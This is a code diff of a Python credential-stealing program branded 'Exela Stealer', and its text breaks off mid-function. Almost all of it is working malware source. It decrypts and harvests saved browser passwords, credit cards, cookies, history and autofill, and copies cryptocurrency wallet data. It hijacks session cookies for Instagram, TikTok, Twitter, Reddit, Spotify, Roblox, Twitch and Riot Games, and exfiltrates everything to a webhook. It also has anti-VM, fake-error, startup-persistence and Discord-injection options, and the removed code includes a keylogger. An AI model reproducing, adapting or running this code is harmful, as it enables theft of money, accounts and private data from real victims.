@@ -1,24 +1,26 @@
-import sqlite3, ctypes, sys
-import os, wmi, platform, psutil, time
+import ctypes, platform
+import json, sys
+import base64
 import shutil
-import base64, json, threading, requests, dhooks, re, subprocess
+import sqlite3
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-from pynput import keyboard
-
-UrLxD = '%WEBHOOK_URL%'
-Anti_Vm = bool('%AnTiVm%')
-startup_xd = "'%StartupMethod%'"
-injectKeylogger = bool('%Keylogger%')
-inject_discord = bool('%Injection%')
+import re
+import os
+import asyncio
+import aiohttp
+import base64
+import time
+webhook = '%WEBHOOK%'
+discord_injection = bool("%injection%")
+startup_method = "%startup_method%".lower()
+Anti_VM = bool("%Anti_VM%")
 FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))  
 
 def create_mutex(mutex_value) -> bool:
-    try:
-        kernel32 = ctypes.windll.kernel32 #kernel32.dll 
-        mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutex
-        return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
-    except: return True
+    kernel32 = ctypes.windll.kernel32 #kernel32.dll 
+    mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutex
+    return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
 
 class SubModules:
     @staticmethod
@@ -76,1122 +78,1920 @@ class SubModules:
         except:
             return "Decryption Error!, Data cant be decrypt"
 
-
-class QuicaxdExela:
-    def __init__(self):
-        self.hook = dhooks.Webhook(UrLxD,username="quicaxd")
-        self.local_app_data = os.getenv("LOCALAPPDATA")
-        self.roaming_app_data = os.getenv('appdata')
-        self.MozillaPath = os.path.join(self.roaming_app_data, "Mozilla", "Firefox", "Profiles")
-        self.mozilla_profiles_full_path = list()
-        self.login_data_path = ""
-        self.backup_login_data_path = os.environ["temp"] + "\\login_data_copy.db"
-        self.passwords_list = list()
+class Main:
+    def __init__(self) -> None:
+        self.profiles_full_path = list()
+        self.RoamingAppData = os.getenv('APPDATA')
+        self.LocalAppData = os.getenv('LOCALAPPDATA')
+        self.Temp = os.getenv('TEMP') 
+        self.FireFox = bool()
+        self.FirefoxFilesFullPath = list()
+        self.FirefoxCookieList = list()
+        self.FirefoxHistoryList = list()
+        self.FirefoxAutofiList = list()
+        self.processList = list()
+        self.lastCipboardList = list()
+        self.systeminfoList = list()
+        self.password_list = list()
         self.cookie_list = list()
         self.card_list = list()
-        self.downloads_list = list()
         self.history_list = list()
-        self.mozilla_history = list()
-        self.mozilla_cookie =list()      
-        self.dcToken = list()
-        self.fullTokens = list()
-        self.validatedTokens = list()
-        self.discordd = list()
-        self.instagram_account_list = list()
-        self.twitter_account_list = list()
-        self.tiktok_account_list = list()
-        self.reddit_account_list = list()
-        self.steam_account_list = list()
-        self.roblox_account_list = list()
-        self.growtopia_account_list = list()     
-        if not startup_xd == "no-startup":
-            self.copyToStartup()   
-        self.doitEveryProfile()
-        self.callMozilla()
-        self.setSteam()
-        self.setDiscord()
-        self.writeAllData()
-        self.sendxd()
-    def callMozilla(self):
-        self.GetMozillaProfiles()
-        self.get_cookies_firefox()
-        self.get_historys_firefox()
-    def doitEveryProfile(self):
-        profiles = ['Default', 'Guest Profile']
-        for x in range(1, 51): 
-            profiles.append(f'Profile {x}')
-        full_browsers = {
-            'Opera GX' : self.roaming_app_data + os.path.join("\Opera Software", "Opera GX Stable"),
-            'Opera' : self.roaming_app_data + os.path.join("\Opera Software", "Opera Stable"),
-            'Chrome' : self.local_app_data + os.path.join("\Google", "Chrome","User Data"),
-            'Brave' : self.local_app_data + os.path.join("\BraveSoftware", "Brave-Browser","User Data"),
-            'Edge' : self.local_app_data + os.path.join("\Microsoft", "Edge","User Data"),
-            'Vivaldi' : self.local_app_data + os.path.join("\Vivaldi","User Data"),
+        self.autofill_list = list()
+        self.bookmark_list = list()
+        self.download_list = list()
+        self.NetworkList = list()
+        self.validated_tokens = list()
+        self.full_tokens = list()
+        self.instagramSessionList = list()
+        self.riotGamesSessionList = list()
+        self.tiktokSessionList = list()
+        self.twitterSessionList = list()
+        self.twitchSessionList = list()
+        self.redditSessionList = list()
+        self.spotifySessionList = list()
+        self.steamSessionList = list()
+        self.robloxSessionList = list()
+        self.discordAccountList = list()
+        self.wifiList = list()
+    async def main(self):
+        try:
+            processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM chrome.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            await processes.communicate() 
+        except:pass
+        await self.list_profiles()
+        await self.ListFirefoxProfiles()
+        taskk = [
+            asyncio.create_task(self.GetPasswords()),
+            asyncio.create_task(self.GetCards()),
+            asyncio.create_task(self.GetCookies()),
+            asyncio.create_task(self.GetFirefoxCookies()),
+            asyncio.create_task(self.GetHistory()),
+            asyncio.create_task(self.GetFirefoxHistorys()),
+            asyncio.create_task(self.GetDownload()),
+            asyncio.create_task(self.GetBookMark()),
+            asyncio.create_task(self.GetAutoFill()),
+            asyncio.create_task(self.GetFirefoxAutoFills()),
+            asyncio.create_task(self.GetProcessINfo()),
+            asyncio.create_task(self.GetLastClipboard()),
+            asyncio.create_task(self.GetSteamSession()),
+            asyncio.create_task(self.GetSystemInfo()),
+            asyncio.create_task(self.ExrtactWifiPasswords()),
+            asyncio.create_task(self.GetNetworkInfo()),
+            asyncio.create_task(self.GetTokens()),
+            asyncio.create_task(self.DiscordInjection()),]
+        await asyncio.gather(*taskk)
+        await self.WriteToText()
+        await self.SendAllData()
+    async def list_profiles(self) -> None:
+        directorys = {
+            'Google Chrome' : os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
+            'Opera'  : os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
+            'Opera GX' : os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),    
+            'Brave' : os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
+            'Edge' : os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
         }
-        for _,path in full_browsers.items():
-            for f in profiles:
-                 self.connect_to_database(path, f)
-                 self.connect_to_database2(path, f) 
-                 self.connect_to_database3(path, f)
-                 self.connect_to_database4(path, f)
-                 self.connect_to_database5(path, f)
-
-    def connect_to_database(self, value, value2):
-        try:
-            path = f"{value}\\{value2}" + "\\Login Data"
-            profPath = f"{value}\\{value2}"
-            if "Opera" in path:
-                if "Profile" in path:
-                    return
+        for junk, directory in directorys.items():
+            if os.path.isdir(directory):
+                if "Opera" in directory:
+                    self.profiles_full_path.append(directory)
                 else:
-                    path = path.replace("\\Default", "")
-                    profPath = profPath.replace("\\Default", "")
-            if not os.path.isfile(path):
-                return
-            else:
-                try:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-                except:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
-                self.login_data_path = path
-                shutil.copy2(self.login_data_path, self.backup_login_data_path)
-                conn = sqlite3.connect(self.backup_login_data_path)
-                cursor = conn.cursor()
-                query = "SELECT origin_url, username_value, password_value FROM logins"
-                cursor.execute(query)
+                    for root, folders, files in os.walk(directory):
+                        for folder in folders:
+                            folder_path = os.path.join(root, folder)
+                            if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder:
+                                self.profiles_full_path.append(folder_path)
+    async def ListFirefoxProfiles(self) -> None:
+        try:
+            directory = os.path.join(self.RoamingAppData , "Mozilla", "Firefox", "Profiles")
+            if os.path.isdir(directory):
+                for root, dirs, files in os.walk(directory):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        if file.endswith("cookies.sqlite") or file.endswith("places.sqlite") or file.endswith("formhistory.sqlite"):
+                            self.FirefoxFilesFullPath.append(file_path)
+        except:
+            pass
+    async def GetFirefoxCookies(self) -> None:
+        try:
+            for files in self.FirefoxFilesFullPath:
+                if "cookie" in files:
+                    database_connection = sqlite3.connect(files)
+                    cursor = database_connection.cursor()
+                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
+                    twitch_username = None
+                    twitch_cookie = None
+                    cookies = cursor.fetchall()
+                    for cookie in cookies:
+                        self.FirefoxCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
+                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
+                            asyncio.create_task(self.InstaSession(cookie[3], "Firefox"))
+                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
+                            asyncio.create_task(self.TikTokSession(cookie[3], "Firefox"))
+                        if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
+                            asyncio.create_task(self.TwitterSession(cookie[3], "Firefox"))
+                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
+                            asyncio.create_task(self.RedditSession(cookie[3], "Firefox"))
+                        if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
+                            asyncio.create_task(self.SpotifySession(cookie[3], "Firefox"))
+                        if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
+                            asyncio.create_task(self.RobloxSession(cookie[3], "Firefox"))
+                        if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
+                            twitch_cookie = cookie[3]
+                        if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
+                            twitch_username = cookie[3]
+                        if not twitch_username == None and not twitch_cookie == None:
+                            asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, "Firefox"))
+                            twitch_username = None
+                            twitch_cookie = None
+                        if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
+                            asyncio.create_task(self.RiotGamesSession(cookie[3], "Firefox"))
+        except:
+            pass
+        else:
+            self.FireFox = True
+    async def GetFirefoxHistorys(self) -> None:
+        try:
+            for files in self.FirefoxFilesFullPath:
+                if "places" in files:
+                    database_connection = sqlite3.connect(files)
+                    cursor = database_connection.cursor()
+                    cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
+                    historys = cursor.fetchall()
+                    for history in historys:
+                        self.FirefoxHistoryList.append(f"ID: {history[0]} | URL: {history[1]} | Title: {history[2]} | Visit Count: {history[3]} | Last Visit Time: {history[4]}\n")
+        except:
+            pass
+        else:
+            self.FireFox = True
+    async def GetFirefoxAutoFills(self) -> None:
+        try:
+            for files in self.FirefoxFilesFullPath:
+                if "formhistory" in files:
+                    database_connection = sqlite3.connect(files)
+                    cursor = database_connection.cursor()
+                    cursor.execute("select * from moz_formhistory")
+                    autofills = cursor.fetchall()
+                    for autofill in autofills:
+                        self.FirefoxAutofiList.append(f"{autofill}\n")
+        except:
+            pass
+        else:
+            self.FireFox = True
+    async def GetPasswords(self) -> None:
+        try:
+            for path in self.profiles_full_path:
+                BrowserName = "None"
+                index = path.find("User Data")
+                if index != -1:
+                    user_data_part = path[:index + len("User Data")]
+                if "Opera" in path:
+                    user_data_part = path
+                    BrowserName = "Opera"
+                else:
+                    text = path.split("\\")
+                    BrowserName = text[-4] + " " + text[-3]
+                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
+                LoginData = os.path.join(path, "Login Data")
+                copied_file_path = os.path.join(self.Temp, "Logins.db")
+                shutil.copyfile(LoginData, copied_file_path)
+                database_connection = sqlite3.connect(copied_file_path)
+                cursor = database_connection.cursor()
+                cursor.execute('select origin_url, username_value, password_value from logins')
                 logins = cursor.fetchall()
-                conn.close()
-                os.remove(self.backup_login_data_path)
-                key = SubModules.GetKey(os.path.join(value, "Local State"))
+                try:
+                    cursor.close()
+                    database_connection.close()
+                    os.remove(copied_file_path)
+                except:pass
                 for login in logins:
-                    if login[1] and login[2]:
-                        url = login[0]
-                        username = login[1]
-                        password = SubModules.Decrpytion(login[2], key)
-                        self.passwords_list.append(f"URL: {url}\nUsername : {username}\nPasswords : {password}\nBrowser : {profil_kismi}\n==================================================\n")
+                    if login[0] and login[1] and login[2]:
+                        self.password_list.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {SubModules.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
         except:
             pass
-    def connect_to_database2(self, value, value2):
+    async def GetCards(self) -> None:
         try:
-            path = f"{value}\\{value2}" + "\\Web Data"
-            profPath = f"{value}\\{value2}"
-            if "Opera" in path:
-                if "Profile" in path:
-                    return
-                else:
-                    path = path.replace("\\Default", "")
-                    profPath = profPath.replace("\\Default", "")
-            if not os.path.isfile(path):
-                return
-            else:
-                self.login_data_path = path
-                shutil.copy2(self.login_data_path, self.backup_login_data_path)
-                conn = sqlite3.connect(self.backup_login_data_path)
-                cursor = conn.cursor()
-                query = "select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards"
-                cursor.execute(query)
-                logins = cursor.fetchall()
-                conn.close()
-                os.remove(self.backup_login_data_path)
-                key = SubModules.GetKey(os.path.join(value, "Local State"))
-                for cc in logins:
-                    if cc[0]:
-                        if cc[2] < 10:
-                            month = "0"  + f"{cc[2]}"
-                        else:month = cc[2]
-                        self.card_list.append(str(SubModules.Decrpytion(cc[0], key)) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
-        except:
-            pass
-    def connect_to_database3(self, value, value2):
-        try:
-            path = f"{value}\\{value2}" + "\\Network\\Cookies"
-            profPath = f"{value}\\{value2}"
-            if "Opera" in path:
-                if "Profile" in path:
-                    return
-                else:
-                    path = path.replace("\\Default", "")
-                    profPath = profPath.replace("\\Default", "")
-            if not os.path.isfile(path):
-                return
-            else:
+            for path in self.profiles_full_path:
+                index = path.find("User Data")
+                if index != -1:
+                    user_data_part = path[:index + len("User Data")]
+                if "Opera" in path:
+                    user_data_part = path
+                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
+                WebData = os.path.join(path, "Web Data")
+                copied_file_path = os.path.join(self.Temp, "Web.db")
+                shutil.copyfile(WebData, copied_file_path)
+                database_connection = sqlite3.connect(copied_file_path)
+                cursor = database_connection.cursor()
+                cursor.execute('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
+                cards = cursor.fetchall()
                 try:
-                    ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-                except:
-                    ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
-                profil_kismi = profil_kismii.replace("_", " ")
-                self.login_data_path = path
-                try:
-                    shutil.copy2(self.login_data_path, self.backup_login_data_path)
-                except:
-                    try:
-                        subprocess.run("taskkill /IM chrome.exe", shell=True) # just chrome browser protect cookies, we need to close it
-                        time.sleep(1.5)
-                        shutil.copy2(self.login_data_path, self.backup_login_data_path)
-                    except:
-                        pass
-                conn = sqlite3.connect(self.backup_login_data_path)
-                cursor = conn.cursor()
-                query = "select host_key, name, path, encrypted_value,expires_utc from cookies"
-                cursor.execute(query)
-                logins = cursor.fetchall()
-                conn.close()
-                os.remove(self.backup_login_data_path)
-                key = SubModules.GetKey(os.path.join(value, "Local State"))
-                for cookie in logins:
-                    if cookie[3]:
-                        cooked = SubModules.Decrpytion(cookie[3],key)
-                        self.cookie_list.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cooked}")
-                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
-                            self.setInstaSession(cooked, profil_kismi)
-                        if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
-                            self.setTwitterSession(cooked, profil_kismi)
-                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]).lower() == "sessionid":
-                            self.setTiktokSession(cooked, profil_kismi)
-                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
-                            self.setRedditSession(cooked, profil_kismi)
-                        if "roblox" in str(cookie[0]).lower() and ".ROBLOSECURITY" in str(cookie[1]):
-                            self.setRoblox(cooked, profil_kismi)
+                    cursor.close()
+                    database_connection.close()
+                    os.remove(copied_file_path)
+                except:pass
+                for card in cards:
+                    if card[2] < 10:
+                        month = "0" + str(card[2])
+                    else:month = card[2]
+                    self.card_list.append(f"{SubModules.Decrpytion(card[0], key)} {month}/{card[1]} {card[3]}\n")
         except:
-            pass
-    def connect_to_database4(self, value, value2):
+            pass 
+    async def GetCookies(self) -> None:
         try:
-            path = f"{value}\\{value2}" + "\\History"
-            profPath = f"{value}\\{value2}"
-            if "Opera" in path:
-                if "Profile" in path:
-                    return
+            for path in self.profiles_full_path:
+                BrowserName = "None"
+                index = path.find("User Data")
+                if index != -1:
+                    user_data_part = path[:index + len("User Data")]
+                if "Opera" in path:
+                    user_data_part = path
+                    BrowserName = "Opera"
                 else:
-                    path = path.replace("\\Default", "")
-                    profPath = profPath.replace("\\Default", "")
-            if not os.path.isfile(path):
-                return
-            else:
-                self.login_data_path = path
-                shutil.copy2(self.login_data_path, self.backup_login_data_path)
-                conn = sqlite3.connect(self.backup_login_data_path)
-                cursor = conn.cursor()
-                query = "select tab_url, target_path from downloads"
-                cursor.execute(query)
-                logins = cursor.fetchall()
-                conn.close()
-                os.remove(self.backup_login_data_path)
-                for dwnlds in logins:
-                    if dwnlds[0] or dwnlds[1]:
-                        self.downloads_list.append(f"{dwnlds[0]} : {dwnlds[1]}")
-        except:
-            pass
-    def connect_to_database5(self, value, value2):
-        try:
-            path = f"{value}\\{value2}" + "\\History"
-            profPath = f"{value}\\{value2}"
-            if "Opera" in path:
-                if "Profile" in path:
-                    return
-                else:
-                    path = path.replace("\\Default", "")
-                    profPath = profPath.replace("\\Default", "")
-            if not os.path.isfile(path):
-                return
-            else:
-                self.login_data_path = path
-                shutil.copy2(self.login_data_path, self.backup_login_data_path)
-                conn = sqlite3.connect(self.backup_login_data_path)
-                cursor = conn.cursor()
-                query = "select id, url, title, visit_count, last_visit_time from urls"
-                cursor.execute(query)
-                logins = cursor.fetchall()
-                conn.close()
-                os.remove(self.backup_login_data_path)
-                for hstrys in logins:
-                    if hstrys[0] or hstrys[1]:
-                        self.history_list.append(f"ID : {hstrys[0]} | URL : {hstrys[1]} | Title : {hstrys[2]} | Visit Count : {hstrys[3]} | Last Visit Time {hstrys[4]}")
-        except:
-            pass
-    def GetMozillaProfiles(self):
-        try:
-            list_directory = os.listdir(self.MozillaPath)
-            for listed_dir in list_directory:
-                new_dir = os.path.join(self.MozillaPath, listed_dir)
-                self.mozilla_profiles_full_path.append(new_dir)
-        except:
-            pass
-    def get_cookies_firefox(self):
-        for file in self.mozilla_profiles_full_path:
-            history_path = os.path.join(file, "cookies.sqlite")
-            if not os.path.isfile(history_path):
-                continue
-            else:
+                    text = path.split("\\")
+                    BrowserName = text[-4] + " " + text[-3]
+                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
+                CookieData = os.path.join(path, "Network", "Cookies")
+                copied_file_path = os.path.join(self.Temp, "Cookies.db")
                 try:
-                    conn = sqlite3.connect(history_path)
-                    cursor = conn.cursor()
-                    for cookie in cursor.execute("SELECT host,name, path, value, expiry FROM moz_cookies").fetchall():
-                        self.mozilla_cookie.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}")
-                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
-                            self.setInstaSession(cookie[3], "Firefox")
-                        if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
-                            self.setTwitterSession(cookie[3], "Firefox")
-                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]).lower() == "sessionid":
-                            self.setTiktokSession(cookie[3], "Firefox")
-                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
-                            self.setRedditSession(cookie[3], "Firefox")
-                        if "roblox" in str(cookie[0]).lower() and ".ROBLOSECURITY" in str(cookie[1]):
-                            self.setRoblox(cookie[0], "Firefox")
-                except Exception as e:
-                    print(str(e))
-    def get_historys_firefox(self):
-        for file in self.mozilla_profiles_full_path:
-            history_path = os.path.join(file, "places.sqlite")
-            if not os.path.isfile(history_path):
-                continue
-            else:
-                try:
-                    conn = sqlite3.connect(history_path)
-                    cursor = conn.cursor()
-                    for row in cursor.execute("SELECT id, url, title, visit_count, last_visit_date FROM moz_places;").fetchall():
-                        self.mozilla_history.append(f"ID : {row[0]} | URL : {row[1]} | Title : {row[2]} | Visit Count : {row[3]} | Last Visit Time {row[4]}")
+                    shutil.copyfile(CookieData, copied_file_path)
                 except:
                     pass
-    def setInstaSession(self, cookie, value):
+                database_connection = sqlite3.connect(copied_file_path)
+                cursor = database_connection.cursor()
+                cursor.execute('select host_key, name, path, encrypted_value,expires_utc from cookies')
+                cookies = cursor.fetchall()
+                try:
+                    cursor.close()
+                    database_connection.close()
+                    os.remove(copied_file_path)
+                except:pass
+                twitch_username = None
+                twitch_cookie = None
+                for cookie in cookies:
+                    dec_cookie = SubModules.Decrpytion(cookie[3], key)
+                    self.cookie_list.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")
+                    if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
+                        asyncio.create_task(self.InstaSession(dec_cookie, BrowserName))
+                    if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
+                        asyncio.create_task(self.TikTokSession(dec_cookie, BrowserName))
+                    if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
+                        asyncio.create_task(self.TwitterSession(dec_cookie, BrowserName))
+                    if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
+                        asyncio.create_task(self.RedditSession(dec_cookie, BrowserName))
+                    if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
+                        asyncio.create_task(self.SpotifySession(dec_cookie, BrowserName))
+                    if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
+                        asyncio.create_task(self.RobloxSession(dec_cookie, BrowserName))
+                    if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
+                        twitch_cookie = dec_cookie
+                    if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
+                        twitch_username = dec_cookie
+                    if not twitch_username == None and not twitch_cookie == None:
+                        asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, BrowserName))
+                        twitch_username = None
+                        twitch_cookie = None
+                    if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
+                        asyncio.create_task(self.RiotGamesSession(dec_cookie, BrowserName))
+        except:
+            pass
+    async def GetWallets(self, copied_path:str) -> None:
+        try:
+            wallets_ext_names = {
+                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
+                "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
+                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
+                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
+                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
+                "Coin98": "aeachknmefphepccionboohckonoeemg",
+                "KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
+                "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
+                "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
+                "Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib",
+                "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
+                "MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk",
+                "Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",
+                "XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
+                "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
+                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
+                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
+                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
+                "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",}
+            wallet_local_paths = {
+                "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
+                "Armory": os.path.join(self.RoamingAppData, "Armory"),
+                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
+                "Jaxx": os.path.join(self.RoamingAppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
+                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
+                "Ethereum": os.path.join(self.RoamingAppData, "Ethereum", "keystore"),
+                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
+                "AtomicWallet": os.path.join(self.RoamingAppData, "atomic", "Local Storage","leveldb"),
+                "Guarda": os.path.join(self.RoamingAppData, "Guarda", "Local Storage","leveldb"),
+                "Coinomi": os.path.join(self.RoamingAppData, "Coinomi", "Coinomi", "wallets"),
+            }
+            os.mkdir(os.path.join(copied_path, "Wallets"))
+            for path in self.profiles_full_path:
+                ext_path = os.path.join(path, "Local Extension Settings") 
+                if os.path.exists(ext_path):
+                    for wallet_name, wallet_addr in wallets_ext_names.items():
+                        if os.path.isdir(os.path.join(ext_path, wallet_addr)):
+                            print(os.path.join(ext_path, wallet_addr))
+                            try:
+                                splited = os.path.join(ext_path, wallet_addr).split("\\")
+                                file_name = f"{splited[5]} {splited[6]} {splited[8]} {wallet_name}"
+                                os.makedirs(copied_path  + "\\Wallets\\" + file_name)
+                                shutil.copytree(os.path.join(ext_path, wallet_addr), os.path.join(copied_path, "Wallets", file_name, wallet_addr))
+                            except:
+                                continue
+            for wallet_names, wallet_paths in wallet_local_paths.items():
+                try:
+                    if os.path.exists(wallet_paths):
+                        shutil.copytree(wallet_paths, os.path.join(copied_path, "Wallets", wallet_names))
+                except:continue
+        except:
+            pass
+    
+    async def GetHistory(self) -> None:
+        try:
+            for path in self.profiles_full_path:
+                HistoryData = os.path.join(path, "History")
+                copied_file_path = os.path.join(self.Temp, "HistoryData.db")
+                shutil.copyfile(HistoryData, copied_file_path)
+                database_connection = sqlite3.connect(copied_file_path)
+                cursor = database_connection.cursor()
+                cursor.execute('select id, url, title, visit_count, last_visit_time from urls')
+                historys = cursor.fetchall()
+                try:
+                    cursor.close()
+                    database_connection.close()
+                    os.remove(copied_file_path)
+                except:pass
+                for history in historys:
+                    self.history_list.append(f"ID : {history[0]} | URL : {history[1]} | Title : {history[2]} | Visit Count : {history[3]} | Last Visit Time {history[4]}\n")
+        except:
+            pass
+
+    async def GetAutoFill(self) -> None:
+        try:
+            for path in self.profiles_full_path:
+                AutofillData = os.path.join(path, "Web Data")
+                copied_file_path = os.path.join(self.Temp, "AutofillData.db")
+                shutil.copyfile(AutofillData, copied_file_path)
+                database_connection = sqlite3.connect(copied_file_path)
+                cursor = database_connection.cursor()
+                cursor.execute('select * from autofill')
+                autofills = cursor.fetchall()
+                try:
+                    cursor.close()
+                    database_connection.close()
+                    os.remove(copied_file_path)
+                except:pass
+                for autofill in autofills:
+                    if autofill:
+                        self.autofill_list.append(f"{autofill}\n")
+        except Exception as e:print(e)
+
+    async def GetBookMark(self) -> None:
+        try:
+            for path in self.profiles_full_path:
+                BookmarkData = os.path.join(path, "Bookmarks")
+                if os.path.isfile(BookmarkData):
+                    with open(BookmarkData, "r", encoding="utf-8", errors="ignore") as file:
+                        data = json.load(file)
+                    data = data["roots"]["bookmark_bar"]["children"]
+                    if data:
+                        self.bookmark_list.append(f"Browser Path : {path}\nID : {data['id']}\nName : {data['name']}\nURL : {data['url']}\nGUID : {data['guid']}\nAdded At : {data['date_added']}\n\n=========================================================")
+        except:
+            pass
+    async def GetDownload(self) -> None:
+        try:
+            for path in self.profiles_full_path:
+                DownloadData = os.path.join(path, "History")
+                copied_file_path = os.path.join(self.Temp, "DownloadData.db")
+                shutil.copyfile(DownloadData, copied_file_path)
+                database_connection = sqlite3.connect(copied_file_path)
+                cursor = database_connection.cursor()
+                cursor.execute('select tab_url, target_path from downloads')
+                downloads = cursor.fetchall()
+                try:
+                    cursor.close()
+                    database_connection.close()
+                    os.remove(copied_file_path)
+                except:pass
+                for download in downloads:
+                    self.download_list.append(f"{download[0]} : {download[1]}\n")
+        except:
+            pass
+    async def RiotGamesSession(self, cookie, browser:str) -> None:
+        try:
+            connector = aiohttp.TCPConnector(ssl=True)  
+            async with aiohttp.ClientSession(connector=connector) as session:
+                async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
+                    response = await req.json()
+                embed_data = {
+                    "title": "***Exela Stealer***",
+                    "description": f"***Exela Riot Games Session was detected on the {browser} browser***",
+                    "url" : "https://t.me/ExelaStealer",
+                    "color": 0,
+                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                    "thumbnail": {"url": "https://i.hizliresim.com/qxnzimj.jpg"}}
+                username = str(response["username"])
+                email = str(response["email"])
+                region = str(response["region"])
+                locale = str(response["locale"])
+                country = str(response["country"])
+                mfa = str(response["mfa"]["verified"])
